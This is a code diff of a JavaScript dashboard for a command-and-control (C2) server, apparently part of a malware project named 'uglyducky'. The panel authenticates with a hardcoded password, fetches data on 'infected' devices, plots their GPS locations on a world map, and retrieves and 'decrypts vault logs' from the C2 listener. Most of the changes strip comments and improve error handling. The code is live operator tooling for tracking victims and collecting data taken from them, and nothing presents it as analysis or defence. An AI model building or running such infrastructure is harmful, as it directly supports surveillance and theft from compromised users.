@@ -3,8 +3,6 @@
 // --- CONFIGURATION ---
 // ==================================================================
 const C2_LISTENER_URL = "https://uglyducky-c2.onrender.com"; 
-
-// --- NEW SECURITY MEASURE ---
 const DASHBOARD_PASSWORD = "ducky_admin_2024"; 
 // ==================================================================
 
@@ -35,7 +33,7 @@ document.addEventListener("DOMContentLoaded", () => {
     switchTab('extraction'); 
     initDragAndDrop();
     initResizers();
-    initMap(); // Initialize Leaflet Engine
+    initMap(); 
     renderNodesList(); 
 });
 
@@ -46,31 +44,27 @@ function initMap() {
     const mapContainer = document.getElementById('map-container');
     if (!mapContainer) return;
 
-    // Set absolute borders for the world to prevent scrolling into the void
     const worldBounds = [
-        [-90, -180], // South-West edge
-        [90, 180]    // North-East edge
+        [-90, -180], 
+        [90, 180]    
     ];
 
-    // Create the map engine, centered on the Atlantic
     leafletMap = L.map('map-container', {
-        zoomControl: false, // Clean look
-        attributionControl: false, // Clean look
-        maxBounds: worldBounds,       // Locks the camera inside the world
-        maxBoundsViscosity: 1.0,      // Makes the edge a hard wall
-        minZoom: 2                    // Prevents zooming out too far
+        zoomControl: false, 
+        attributionControl: false, 
+        maxBounds: worldBounds,       
+        maxBoundsViscosity: 1.0,      
+        minZoom: 2                    
     }).setView([20, 0], 2);
 
-    // Load CartoDB Dark Matter map (Borders, no labels, high quality)
     L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
         subdomains: 'abcd',
         maxZoom: 19,
         minZoom: 2,
-        noWrap: true,                 // Stops the map from duplicating infinitely horizontally
+        noWrap: true,                 
         bounds: worldBounds
     }).addTo(leafletMap);
 
-    // Forces Leaflet to re-calculate its size if you resize the panel
     new ResizeObserver(() => {
         if (leafletMap) leafletMap.invalidateSize();
     }).observe(mapContainer);
@@ -79,14 +73,12 @@ function initMap() {
 function renderMap() {
     if (!leafletMap) return;
 
-    // Clear old markers
     leafletMarkers.forEach(m => leafletMap.removeLayer(m));
     leafletMarkers = [];
     
     allNodes.forEach(node => {
         let dotColor = node.status === 'green' ? 'text-green-500' : (node.status === 'red' ? 'text-red-500' : 'text-yellow-500');
         
-        // Build the exact HTML layout we want for our custom dot
         const customHtml = `
             <div class="map-dot ${dotColor}">
                 <div class="map-tooltip text-[10px] text-left pointer-events-none">
@@ -97,15 +89,13 @@ function renderMap() {
                 </div>
             </div>`;
 
-        // Inject the HTML directly onto the Leaflet map engine
         const customIcon = L.divIcon({
-            className: 'bg-transparent border-none', // Removes default leaflet white square
-            iconSize: [14, 14], // Updated size to match new CSS
-            iconAnchor: [7, 7], // Centers the larger dot perfectly on the GPS coordinate
+            className: 'bg-transparent border-none', 
+            iconSize: [14, 14], 
+            iconAnchor: [7, 7], 
             html: customHtml
         });
 
-        // Add the marker natively using accurate GPS coordinates
         const marker = L.marker([node.lat, node.lng], { icon: customIcon }).addTo(leafletMap);
         leafletMarkers.push(marker);
     });
@@ -130,7 +120,6 @@ async function fetchData() {
     const statusMsg = document.getElementById('statusMsg');
     const btn = document.getElementById('connectBtn');
     
-    // Reset UI state
     allNodes = [];
     globalData = [];
     activeNodeId = null;
@@ -141,37 +130,42 @@ async function fetchData() {
     renderMap();
 
     statusMsg.classList.remove('hidden');
-    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Authenticating & fetching node data...';
+    statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Contacting Render Server (May take 50s to wake up)...';
     btn.disabled = true;
     btn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> Working';
 
     try {
         const nodeResponse = await fetch(`${C2_LISTENER_URL}/node/${deviceId}`, {
-            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
+            method: 'GET',
+            headers: { 
+                "X-Dashboard-Password": DASHBOARD_PASSWORD,
+                "Accept": "application/json"
+            }
         });
         
         if (nodeResponse.status === 401) {
-            throw new Error("Unauthorized: Password mismatch.");
+            throw new Error("Unauthorized: Password mismatch. Check DASHBOARD_PASSWORD.");
         }
         if (nodeResponse.status === 404) {
-            throw new Error(`Device ID '${deviceId}' not found.`);
+            throw new Error(`Device ID '${deviceId}' not found in Supabase.`);
         }
         if (!nodeResponse.ok) {
-            throw new Error("API Error fetching node details.");
+            const errData = await nodeResponse.json().catch(() => ({}));
+            throw new Error(`API Error: ${errData.error || nodeResponse.statusText}`);
         }
         
         const nodeData = await nodeResponse.json();
         
-        // --- BULLETPROOF NaN FIX ---
-        // Force the data to be a number. If the API returns missing data or garbage,
-        // it falls back to a default location (Orlando) instead of crashing Leaflet.
+        if (Array.isArray(nodeData) || typeof nodeData.lat === 'undefined') {
+            throw new Error("Target data malformed. Is the new Render backend fully deployed?");
+        }
+        
         nodeData.lat = parseFloat(nodeData.lat);
         nodeData.lng = parseFloat(nodeData.lng);
         
         if (isNaN(nodeData.lat) || isNaN(nodeData.lng)) {
-            nodeData.lat = 28.5383; // Fallback to avoid (NaN, NaN) crash
+            nodeData.lat = 28.5383; 
             nodeData.lng = -81.3792;
-            console.warn("Invalid coordinates from server, using fallback.");
         }
         
         activeNodeId = nodeData.id;
@@ -179,14 +173,17 @@ async function fetchData() {
         renderNodesList();
         renderMap();
         
-        // Pan the camera gracefully to the infected node!
         if (leafletMap) leafletMap.flyTo([nodeData.lat, nodeData.lng], 4, {duration: 1.5});
-
         selectNode(activeNodeId); 
 
         statusMsg.innerHTML = '<i class="fa-solid fa-circle-notch fa-spin text-cyberBlue mr-2"></i>Node found. Decrypting vault logs...';
+        
         const logsResponse = await fetch(`${C2_LISTENER_URL}/logs/${deviceId}`, {
-            headers: { "X-Dashboard-Password": DASHBOARD_PASSWORD }
+            method: 'GET',
+            headers: { 
+                "X-Dashboard-Password": DASHBOARD_PASSWORD,
+                "Accept": "application/json"
+            }
         });
         
         if (!logsResponse.ok) {
@@ -210,8 +207,14 @@ async function fetchData() {
         }
 
     } catch (error) {
-        statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-red-500 mr-2"></i>Error: ${error.message}`;
-        showToast(error.message, "error");
+        // --- SMART ERROR HANDLING ---
+        if (error.message.includes("Failed to fetch") || error.message.includes("NetworkError")) {
+            statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-red-500 mr-2"></i>Server Unreachable: Check if Render is offline.`;
+            showToast("Cannot connect to C2 Server.", "error");
+        } else {
+            statusMsg.innerHTML = `<i class="fa-solid fa-triangle-exclamation text-red-500 mr-2"></i>Error: ${error.message}`;
+            showToast(error.message, "error");
+        }
     } finally {
         btn.disabled = false;
         btn.innerHTML = '<i class="fa-solid fa-unlock-keyhole mr-2"></i> Decrypt';
